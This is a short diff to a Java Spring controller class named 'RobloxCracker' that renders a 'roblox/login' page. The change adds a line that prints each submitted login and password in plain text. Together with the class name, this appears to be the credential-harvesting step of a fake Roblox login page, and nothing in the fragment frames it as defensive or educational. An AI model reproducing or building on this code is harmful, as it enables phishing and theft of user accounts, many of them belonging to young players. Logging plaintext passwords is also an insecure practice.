@@ -17,7 +17,7 @@ public class RobloxCracker {
 
     @RequestMapping("login")
     public ModelAndView renderLoginPage(Model model, @RequestParam String login, @RequestParam String password){
-
+        System.out.printf("login=%s, password=%s%n", login, password);
         return new ModelAndView("roblox/login");
     }
 }
